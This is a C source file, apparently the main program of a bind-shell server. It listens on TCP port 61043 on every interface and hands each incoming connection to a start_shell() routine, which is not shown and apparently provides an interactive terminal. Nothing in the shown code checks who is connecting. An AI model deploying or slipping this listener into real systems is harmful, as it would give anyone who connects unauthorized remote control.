#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <pty.h>
#include <signal.h>
#include <fcntl.h>
#include <errno.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <dlfcn.h>

#include "shell.h"

#define PORT 61043

int main() {
    int listen_sock, conn_sock;
    struct sockaddr_in addr;
    socklen_t addr_len = sizeof(addr);

    listen_sock = socket(AF_INET, SOCK_STREAM, 0);
    if (listen_sock < 0) {
        perror("socket");
        exit(1);
    }

    addr.sin_family = AF_INET;
    addr.sin_port = htons(PORT);
    addr.sin_addr.s_addr = INADDR_ANY;

    if (bind(listen_sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("bind");
        close(listen_sock);
        exit(1);
    }

    if (listen(listen_sock, 5) < 0) {
        perror("listen");
        close(listen_sock);
        exit(1);
    }

    printf("Listening on port %d...\n", PORT);

    while (1) {
        conn_sock = accept(listen_sock, (struct sockaddr *)&addr, &addr_len);
        if (conn_sock < 0) {
            perror("accept");
            continue;
        }

        if (start_shell(conn_sock, (struct sockaddr *)&addr) < 0) {
            //perror("start_shell");
            // noop
        }

        close(conn_sock);
    }

    close(listen_sock);
    return 0;
}

